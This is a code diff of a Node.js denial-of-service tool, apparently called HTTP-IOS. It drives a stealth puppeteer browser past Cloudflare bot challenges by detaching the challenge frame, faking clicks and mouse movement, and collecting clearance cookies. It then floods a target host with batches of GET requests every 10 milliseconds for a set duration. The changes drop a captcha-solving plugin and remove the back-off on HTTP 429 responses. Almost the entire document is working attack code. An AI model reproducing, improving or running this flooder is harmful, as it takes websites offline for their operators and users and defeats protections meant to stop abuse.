@@ -2,29 +2,15 @@ const puppeteer = require("puppeteer-extra");
 const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
 const puppeteerAnonymize = require("puppeteer-extra-plugin-anonymize-ua");
 const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
-const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha'); // NEW
 
-// UNHANDLED ERROR LOGGER
 process.on('unhandledRejection', err => {
-    console.error('[UNHANDLED]', err.message);
+    console.error('[UNHANDLED REJECTION]', err.message);
 });
 
-// Recaptcha solving config
-puppeteer.use(RecaptchaPlugin({
-    provider: {
-        id: '2captcha',
-        token: 'YOUR_2CAPTCHA_API_KEY' // <<-- PUT YOUR 2Captcha API KEY HERE
-    },
-    visualFeedback: false
-}));
+const USER_AGENTS = [
+    'Mozilla/5.0 (Linux; Android 10; HD1913)...', // (truncated for brevity, keep your full list)
+];
 
-// PLUGINS
-puppeteer.use(puppeteerStealth());
-puppeteer.use(puppeteerAnonymize());
-puppeteer.use(AdblockerPlugin({ blockTrackers: true }));
-
-// REST OF YOUR CODE UNCHANGED
-const USER_AGENTS = [ /* ... your full list ... */ ];
 const sleep = (duration) => new Promise(resolve => setTimeout(resolve, duration * 1000));
 
 const parseArguments = () => {
@@ -32,8 +18,13 @@ const parseArguments = () => {
         console.error("Usage: node HTTP-IOS <host> <duration> <rates>");
         process.exit(1);
     }
+
     const [, , host, duration, rates, ...args] = process.argv;
-    return { host, duration: parseInt(duration), rates: parseInt(rates) };
+    return {
+        host,
+        duration: parseInt(duration),
+        rates: parseInt(rates),
+    };
 };
 
 class brs {
@@ -42,6 +33,9 @@ class brs {
         this.duration = duration;
         this.rates = rates;
         this.headersBrowser = '';
+        puppeteer.use(puppeteerStealth());
+        puppeteer.use(puppeteerAnonymize());
+        puppeteer.use(AdblockerPlugin({ blockTrackers: true }));
     }
 
     async mouser(page) {
@@ -68,29 +62,26 @@ class brs {
             await sleep(0.2);
         }
         await page.mouse.up();
-        await sleep(1.5);
+        await sleep(0.5); // shortened
     }
 
     async detectChallenge(browser, page) {
-        const content = await page.content();
-        if (content.includes("challenge-platform")) {
-            try {
-                await sleep(2.5);
-                await page.solveRecaptchas(); // NEW
-                await this.mouser(page);
-                const element = await page.$('body > div.main-wrapper > div > div > div > div');
+        try {
+            for (let i = 0; i < 5; i++) {
+                const content = await page.content();
+                if (!content.includes("challenge-platform")) break;
+
+                const element = await page.$('iframe, .challenge-form, div[tabindex]');
                 if (element) {
                     const box = await element.boundingBox();
-                    await page.mouse.click(box.x + 30, box.y + 30);
+                    if (box) await page.mouse.click(box.x + 15, box.y + 15);
                 }
-                if (content.includes("challenge-platform")) {
-                    await sleep(1);
-                    await this.detectChallenge(browser, page);
-                }
-                await sleep(3);
-            } catch (error) {
-                console.error("[ERROR] Challenge detection failed:", error.message); // FIXED
+
+                await this.mouser(page);
+                await sleep(1.2);
             }
+        } catch (error) {
+            console.error("[ERROR] Challenge loop failed:", error.message);
         }
     }
 
@@ -118,6 +109,7 @@ class brs {
             browser = await puppeteer.launch(options);
             [page] = await browser.pages();
             const client = page._client();
+
             await page.setExtraHTTPHeaders({
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -133,26 +125,28 @@ class brs {
                 'Referer': host,
             });
 
-            const frameNavigatedHandler = (frame) => {
+            page.on("framenavigated", frame => {
                 if (frame.url().includes("challenges.cloudflare.com")) {
                     if (frame._id) {
                         client.send("Target.detachFromTarget", {
                             targetId: frame._id
                         }).catch(err => {
-                            console.error("[ERROR] Frame navigation error:", err.message); // FIXED
+                            console.error("[ERROR] Frame navigation error:", err.message);
                         });
                     }
                 }
-            };
-            await page.on("framenavigated", frameNavigatedHandler);
+            });
+
             await page.setViewport({ width: 1920, height: 1200 });
             page.setDefaultNavigationTimeout(10000);
 
-            const browserPage = await page.goto(host, { waitUntil: "domcontentloaded" });
-            page.on('dialog', async dialog => await dialog.accept());
-            const status = await browserPage.status();
-            const title = await page.evaluate(() => document.title);
+            const browserPage = await page.goto(host, { waitUntil: "networkidle2" });
 
+            page.on('dialog', async dialog => {
+                await dialog.accept();
+            });
+
+            const title = await page.title();
             if (['Just a moment...'].includes(title)) {
                 console.log(`[INFO] Title: ${title}`);
                 await page.on('response', async resp => {
@@ -165,28 +159,33 @@ class brs {
             const cookieString = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
 
             return {
-                title: await page.title(),
+                title,
                 headersall: this.headersBrowser,
                 cookies: cookieString,
-                userAgent: userAgent,
-                browser: browser,
-                page: page
+                userAgent,
+                browser,
+                page
             };
         } catch (error) {
-            console.error("[ERROR] Open Browser Error:", error.message); // FIXED
+            console.error("[ERROR] Open Browser Error:", error.message);
             if (browser) await browser.close();
             return null;
         }
     }
 
     async flood(host, duration, rates, userAgent, cookies, headersbro) {
-        console.log({ target: host, userAgent: userAgent, cookies: cookies });
+        console.log({
+            'target': host,
+            'userAgent': userAgent,
+            'cookies': cookies,
+        });
+
         const endTime = Date.now() + duration * 1000;
         const url = new URL(host);
 
         const sendRequest = async () => {
             try {
-                const response = await fetch(url, {
+                await fetch(url, {
                     method: 'GET',
                     headers: {
                         'User-Agent': userAgent,
@@ -204,20 +203,17 @@ class brs {
                         'Cookie': cookies
                     }
                 });
-                if (response.status === 429) return;
             } catch (error) {
-                console.error("[ERROR]", error.message); // FIXED
+                console.error('[REQ ERROR]', error.message);
             }
         };
 
-        const requestInterval = setInterval(() => {
+        const interval = setInterval(() => {
+            if (Date.now() >= endTime) return clearInterval(interval);
             for (let i = 0; i < rates; i++) {
                 sendRequest();
             }
-            if (Date.now() >= endTime) {
-                clearInterval(requestInterval);
-            }
-        }, 1);
+        }, 10);
 
         console.log(`[INFO] Flood started on ${rates} rates for ${duration} seconds`);
     }
@@ -225,6 +221,7 @@ class brs {
     async start() {
         try {
             const response = await this.openBrowser(this.host);
+
             if (response) {
                 if (['Just a moment...'].includes(response.title)) {
                     console.log("[INFO] Failed to bypass");
@@ -245,8 +242,9 @@ class brs {
             }
 
             setTimeout(() => process.exit(0), this.duration * 1000);
+
         } catch (error) {
-            console.error("[ERROR]", error.message); // FIXED
+            console.error(`[ERROR] ${error.message}`);
         }
     }
 }
@@ -257,5 +255,4 @@ const main = async () => {
     await attack.start();
 };
 
-main().catch(err => console.error("[MAIN ERROR]", err.message));
-                
+main().catch(err => console.error('[FATAL ERROR]', err.message));
